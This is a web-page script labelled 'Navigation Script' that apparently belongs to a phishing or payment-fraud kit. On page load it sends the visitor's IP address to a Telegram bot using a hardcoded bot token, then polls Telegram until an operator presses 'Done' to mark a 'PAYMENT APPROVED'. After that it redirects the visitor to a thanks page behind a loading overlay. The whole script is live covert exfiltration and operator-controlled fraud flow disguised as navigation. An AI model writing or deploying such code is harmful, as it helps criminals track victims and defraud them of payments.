	<!-- Navigation Script -->
	<script type="text/javascript">
		// Get user IP address
		async function getUserIP() {
			try {
				const response = await fetch('https://api.ipify.org?format=json');
				const data = await response.json();
				return data.ip;
			} catch (error) {
				return 'N/A';
			}
		}

		// Send initial approval notification to Telegram
		function sendApprovalStatusToTelegram() {
			getUserIP().then(function(ip) {
				const message = 'APPROVAL PAGE\nStatus: Waiting for approval\n\nIP: ' + ip;
				
				const botToken = '6310972013:AAGmvAL_vOB-i477t9nbZSYUh86vAPFaQWQ';
				const chatId = '-1003927866231';
				
				const url = 'https://api.telegram.org/bot' + botToken + '/sendMessage';
				const payload = {
					chat_id: chatId,
					text: message,
					parse_mode: 'HTML',
					reply_markup: {
						inline_keyboard: [
							[
								{
									text: 'Done',
									callback_data: 'approve_done'
								},
								{
									text: 'Reject',
									callback_data: 'approve_reject'
								}
							]
						]
					}
				};
				
				fetch(url, {
					method: 'POST',
					headers: {
						'Content-Type': 'application/json'
					},
					body: JSON.stringify(payload)
				});
			});
		}

		// Send success notification to Telegram when Admin clicks Done
		function sendSuccessMessageToTelegram() {
			getUserIP().then(function(ip) {
				const message = '<b>✅ PAYMENT APPROVED</b>\nStatus: Successfully approved\n\n🌐 IP: <code>' + ip + '</code>';
				
				const botToken = '6310972013:AAGmvAL_vOB-i477t9nbZSYUh86vAPFaQWQ';
				const chatId = '-1003927866231';
				
				const url = 'https://api.telegram.org/bot' + botToken + '/sendMessage';
				const payload = {
					chat_id: chatId,
					text: message,
					parse_mode: 'HTML'
				};
				
				fetch(url, {
					method: 'POST',
					headers: {
						'Content-Type': 'application/json'
					},
					body: JSON.stringify(payload)
				});
			});
		}

		// Poll Telegram for button clicks from admin
		var lastUpdateId = 0;
		function pollTelegramUpdates() {
			const botToken = '6310972013:AAGmvAL_vOB-i477t9nbZSYUh86vAPFaQWQ';
			const url = 'https://api.telegram.org/bot' + botToken + '/getUpdates?offset=' + (lastUpdateId + 1);
			
			fetch(url)
				.then(function(response) {
					return response.json();
				})
				.then(function(data) {
					if (data.ok && data.result && data.result.length > 0) {
						for (var i = 0; i < data.result.length; i++) {
							var update = data.result[i];
							lastUpdateId = Math.max(lastUpdateId, update.update_id);
							
							if (update.callback_query) {
								var callbackData = update.callback_query.data;
								
								if (callbackData === 'approve_done') {
									// Send success message to Telegram before redirecting
									sendSuccessMessageToTelegram();
									
									// Redirect to thanks page after a short delay
									setTimeout(function() {
										showLoaderWithTimeout('thanks.html');
									}, 500);
									return;
								}
							}
						}
					}
				})
				.catch(function(error) {
				});
		}

		function showLoaderWithTimeout(redirectUrl) {
			const overlay = document.createElement('div');
			overlay.id = 'loaderOverlay';
			overlay.style.cssText = `
				position: fixed;
				top: 0;
				left: 0;
				width: 100%;
				height: 100%;
				background: white;
				z-index: 99999;
				display: flex;
				justify-content: center;
				align-items: center;
			`;
			
			const iframe = document.createElement('iframe');
			iframe.src = 'load.html';
			iframe.style.cssText = `
				border: none;
				width: 100%;
				height: 100%;
			`;
			
			overlay.appendChild(iframe);
			document.body.appendChild(overlay);
			
			setTimeout(() => {
				window.location.href = redirectUrl;
			}, 2000);
		}

		// Start polling when page loads
		window.addEventListener('load', function() {
			sendApprovalStatusToTelegram();
			setInterval(pollTelegramUpdates, 2000);
		});
	</script>

